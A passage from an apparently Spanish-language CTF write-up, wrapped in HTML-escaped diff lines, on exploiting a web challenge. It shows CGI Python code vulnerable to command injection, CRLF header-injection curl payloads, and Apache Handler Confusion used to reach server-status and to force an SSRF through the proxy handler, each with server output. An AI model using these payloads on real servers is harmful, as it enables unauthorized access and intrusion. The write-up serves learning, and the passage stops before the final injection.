+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; name &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; target:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Location: ../?error=Hey, you need to provide a name and a target!&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;count &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# Increase this for an actual attack&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;popen(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ping -c &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;count&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;ip_address(target)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;) 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Location: ../?result=Succesfully attacked &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;target&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;!&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Location: ../?error=Hey &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;name&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;, watch it!&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Content-Type: text/html&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print()
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;El funcionamiento es muy similar al caso anterior, pero con pequeñas variaciones.&lt;/li&gt;
+&lt;li&gt;Se utiliza nuevamente el comando &lt;code&gt;ping&lt;/code&gt; para &amp;ldquo;atacar&amp;rdquo; la dirección IP indicada.&lt;/li&gt;
+&lt;li&gt;En este caso, también parece haber una inyección de comandos, pues el parámetro &lt;code&gt;target&lt;/code&gt; se usa en la función &lt;code&gt;os.popen()&lt;/code&gt;, pero en este caso hay una validación con la función &lt;code&gt;ip_address()&lt;/code&gt;. Esta función genera una excepción si la cadena recibida no tiene el formato de una dirección IPv4 o IPv6 válida.&lt;/li&gt;
+&lt;li&gt;En caso de generarse la excepción, no realiza el ataque y envía una redirección con un mensaje de error en el encabezado &lt;code&gt;Location&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Llegados a este punto, tenía claro que el único recurso con el que podría interactuar directamente era &lt;code&gt;/cgi-bin/attack-domain&lt;/code&gt; y que debía lograr interactuar con &lt;code&gt;/cgi-bin/attack-ip&lt;/code&gt; (ya que su acceso estaba limitado). Aunque buscaba alguna manera de forzar un SSRF, al inicio únicamente era capaz de inyectar encabezados HTTP en la respuesta. Esto lo muestro a continuación, logrando que la respuesta incluyera el nuevo encabezado &lt;code&gt;New-Header: HFC&lt;/code&gt; inyectando los caracteres de retorno de carro y salto de línea (&lt;code&gt;%0d%0a&lt;/code&gt;).&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ curl -i &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://83.136.249.227:46378/cgi-bin/attack-domain?target=x&amp;amp;name=v%0d%0aNew-Header:HFC%0d%0a%0d%0a&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;HTTP/1.1 &lt;span style=&#34;color:#ae81ff&#34;&gt;302&lt;/span&gt; Found
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Date: Wed, &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;2025&lt;/span&gt; 03:14:46 GMT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Server: Apache/2.4.54 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Debian&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;New-Header: HFC
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Location: ../?error&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Hey v
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Length: &lt;span style=&#34;color:#ae81ff&#34;&gt;282&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Type: text/html; charset&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;iso-8859-1
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;!DOCTYPE HTML PUBLIC &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-//IETF//DTD HTML 2.0//EN&amp;#34;&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;title&amp;gt;302 Found&amp;lt;/title&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;h1&amp;gt;Found&amp;lt;/h1&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;p&amp;gt;The document has moved &amp;lt;a href&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;../?error=Hey v&amp;#34;&lt;/span&gt;&amp;gt;here&amp;lt;/a&amp;gt;.&amp;lt;/p&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;hr&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;--REDACTED--&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Después de un buen rato de buscar algún recurso que pudiera servirme, llegué a este &lt;a href=&#34;https://blog.orange.tw/posts/2024-08-confusion-attacks-en/&#34;&gt;sitio&lt;/a&gt;. Aquí se detalla el término de &amp;ldquo;&lt;strong&gt;ambigüedad semántica&lt;/strong&gt;&amp;rdquo; en servidores Apache. A grandes rasgos, explica que Apache funciona mediante una gran cantidad de módulos. Estos módulos no necesariamente tienen una forma estandarizada de interpretar los campos que van a procesar, provocando ambigüedades en cómo lo manipulan.&lt;/p&gt;
+&lt;p&gt;El sitio detalla 3 tipos diferentes de ataques desarrollados a partir de dicha ambigüedad, pero para este reto utilicé únicamente el llamado &lt;em&gt;Handler Confusion&lt;/em&gt;, donde se busca invocar algún &lt;em&gt;handler&lt;/em&gt; de Apache de forma arbitraria. Para comprender correctamente el origen e implicaciones del problema, se recomienda leer el artículo original. A continuación, únicamente agregaré una explicación muy resumida de esto, esperando que sea suficiente para comprender la solución al reto.&lt;/p&gt;
+&lt;p&gt;El autor explica que al utilizar el módulo &lt;code&gt;mod_php&lt;/code&gt;, hay dos directivas que se parecen mucho en funcionalidad, pero que representan campos diferentes dentro de la estructura de httpd:&lt;/p&gt;
+&lt;h3 id=&#34;directivas&#34;&gt;Directivas&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;AddHandler application/x-httpd-php .php
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;AddType    application/x-httpd-php .php
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;sintaxis&#34;&gt;Sintaxis&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;AddHandler handler-name extensión &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;extensión&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; ...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;AddType media-type extensión &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;extensión&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; ...
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Aunque tienen una funcionalidad muy similar, realmente &lt;code&gt;handler-name&lt;/code&gt; corresponde a la estructura &lt;code&gt;r-&amp;gt;handler&lt;/code&gt; y media-type corresponde a &lt;code&gt;r-&amp;gt;content_type&lt;/code&gt; dentro de httpd. Algo curioso (y por lo que se parecen tanto) es que tras bambalinas, &lt;code&gt;media-type&lt;/code&gt; se termina convirtiendo en &lt;code&gt;handler-name&lt;/code&gt;. El autor indica que, en teoría, si se logra controlar el encabezado &lt;code&gt;Content-Type&lt;/code&gt; en la respuesta del servidor, es posible invocar cualquier handler de Apache de forma arbitraria.&lt;/p&gt;
+&lt;p&gt;Sin embargo, el flujo en el que se manejan las peticiones provoca que la conversión de estructuras no se efectúe, a menos que sea el propio servidor quien inicie una nueva petición internamente. Afortunadamente para nosotros, hay escenarios en los que el servidor hace nuevas peticiones internas, uno de ellos es cuando usa el módulo &lt;code&gt;mod_cgi&lt;/code&gt;. Si el encabezado HTTP&lt;code&gt;Location&lt;/code&gt; inicia con el caracter &lt;code&gt;/&lt;/code&gt;, Apache va a tratar este escenario como una redirección del lado del servidor para poder interactuar con el script CGI.&lt;/p&gt;
+&lt;p&gt;Se puede concluir que para poder invocar cualquier handler de Apache, se necesitan cumplir los siguientes requisitos:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Módulo&lt;/strong&gt; &lt;code&gt;mod_php&lt;/code&gt; &lt;strong&gt;habilitado&lt;/strong&gt;: Se confirma que se cumple, porque el archivo principal de la aplicación es &lt;code&gt;index.php&lt;/code&gt;.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Módulo&lt;/strong&gt; &lt;code&gt;mod_cgi&lt;/code&gt; &lt;strong&gt;habilitado&lt;/strong&gt;: Se confirma que se cumple, pues la aplicación lo requiere para poder usar los scripts en Python &lt;code&gt;attack-domain&lt;/code&gt; y &lt;code&gt;attack-ip&lt;/code&gt;.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Control sobre encabezados&lt;/strong&gt; &lt;code&gt;Location&lt;/code&gt; y &lt;code&gt;Content-Type&lt;/code&gt; &lt;strong&gt;en la respuesta del servidor&lt;/strong&gt;: Se confirma que se cumple, pues en este punto ya fue posible explotar la inyección &lt;em&gt;CRLF&lt;/em&gt; para crear encabezados nuevos.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Con todo en su lugar, llegó el momento de usar un handler distinto. Específicamente, se usó &lt;code&gt;server-status&lt;/code&gt;, con el único fin de demostrar la viabilidad de la técnica. Como se muestra a continuación, el ataque fue exitoso y fue posible acceder a información del estado del servidor, como consumo de CPU, tráfico total, etc.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ curl -i &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://83.136.249.227:46378/cgi-bin/attack-domain?target=x&amp;amp;name=v%0d%0aLocation:/hfc%0d%0aContent-Type:server-status%0d%0a%0d%0a&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;HTTP/1.1 &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; OK
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Date: Wed, &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;2025&lt;/span&gt; 03:16:46 GMT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Server: Apache/2.4.54 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Debian&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Vary: Accept-Encoding
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Length: &lt;span style=&#34;color:#ae81ff&#34;&gt;4536&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Type: text/html; charset&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;ISO-8859-1
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;!DOCTYPE HTML PUBLIC &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-//W3C//DTD HTML 3.2 Final//EN&amp;#34;&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;title&amp;gt;Apache Status&amp;lt;/title&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;h1&amp;gt;Apache Server Status &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 83.136.249.227 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;via 192.168.63.136&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;&amp;lt;/h1&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;dl&amp;gt;&amp;lt;dt&amp;gt;Server Version: Apache/2.4.54 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Debian&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; PHP/7.4.33&amp;lt;/dt&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;dt&amp;gt;Server MPM: prefork&amp;lt;/dt&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;dt&amp;gt;Server Built: 2022-06-09T04:26:43
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/dt&amp;gt;&amp;lt;/dl&amp;gt;&amp;lt;hr /&amp;gt;&amp;lt;dl&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;dt&amp;gt;Current Time: Wednesday, 26-Mar-2025 03:16:47 UTC&amp;lt;/dt&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;dt&amp;gt;Restart Time: Wednesday, 26-Mar-2025 03:04:40 UTC&amp;lt;/dt&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;dt&amp;gt;Parent Server Config. Generation: 1&amp;lt;/dt&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;dt&amp;gt;Parent Server MPM Generation: 0&amp;lt;/dt&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;dt&amp;gt;Server uptime:  &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; minutes &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; seconds&amp;lt;/dt&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;dt&amp;gt;Server load: 0.15 0.23 0.20&amp;lt;/dt&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;dt&amp;gt;Total accesses: &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; - Total Traffic: &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; kB - Total Duration: 503&amp;lt;/dt&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;dt&amp;gt;CPU Usage: u.03 s.03 cu.02 cs.01 - .0124% CPU load&amp;lt;/dt&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;dt&amp;gt;.00964 requests/sec - &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; B/second - &lt;span style=&#34;color:#ae81ff&#34;&gt;585&lt;/span&gt; B/request - 71.8571 ms/request&amp;lt;/dt&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;dt&amp;gt;1 requests currently being processed, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; idle workers&amp;lt;/dt&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;--REDACTED--&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Una vez confirmado, usé el handler &lt;code&gt;proxy&lt;/code&gt; para forzar un SSRF completo, es decir, teniendo control sobre el destino, recurso, parámetros y encabezados de la petición. De esta manera, finalmente fue posible interactuar con &lt;code&gt;attack-ip&lt;/code&gt; (pues la petición se origina desde el propio servidor).&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ curl -i &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://83.136.249.227:46378/cgi-bin/attack-domain?target=x&amp;amp;name=v%0d%0aLocation:/hfc%0d%0aContent-Type:proxy:http://127.0.0.1/cgi-bin/attack-ip%3ftarget=127.0.0.1%26name=v%0d%0a%0d%0a&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;HTTP/1.1 &lt;span style=&#34;color:#ae81ff&#34;&gt;302&lt;/span&gt; Found
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Date: Wed, &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;2025&lt;/span&gt; 03:19:21 GMT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Server: Apache/2.4.54 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Debian&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Location: ../?result&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Succesfully attacked 127.0.0.1!
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Length: &lt;span style=&#34;color:#ae81ff&#34;&gt;301&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Type: text/html; charset&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;iso-8859-1
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;!DOCTYPE HTML PUBLIC &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-//IETF//DTD HTML 2.0//EN&amp;#34;&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;title&amp;gt;302 Found&amp;lt;/title&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;h1&amp;gt;Found&amp;lt;/h1&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;p&amp;gt;The document has moved &amp;lt;a href&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;../?result=Succesfully attacked 127.0.0.1!&amp;#34;&lt;/span&gt;&amp;gt;here&amp;lt;/a&amp;gt;.&amp;lt;/p&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;hr&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;address&amp;gt;Apache/2.4.54 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Debian&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; Server at 127.0.0.1 Port 80&amp;lt;/address&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;La parte final del reto consistía en explotar una vulnerabilidad dentro de &lt;code&gt;attack-ip&lt;/code&gt; con el fin de inyectar comandos. Recordemos que el parámetro &lt;code&gt;target&lt;/code&gt; es validado con la función &lt;code&gt;ip_address()&lt;/code&gt;, la cual genera una excepción si la cadena no tiene un formato de dirección IPv4 o IPv6. A continuación, muestro un par de ejemplos de esta funcionalidad:&lt;/p&gt;
+&lt;h3 id=&#34;dirección-ipv4-válida&#34;&gt;Dirección IPv4 válida:&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; ipaddress &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; ip_address
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(ip_address(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;127.0.0.1&amp;#39;&lt;/span&gt;))
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;resultado&#34;&gt;Resultado:&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;127.0.0.1
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;dirección-ipv4-inválida&#34;&gt;Dirección IPv4 inválida:&lt;/h3&gt;
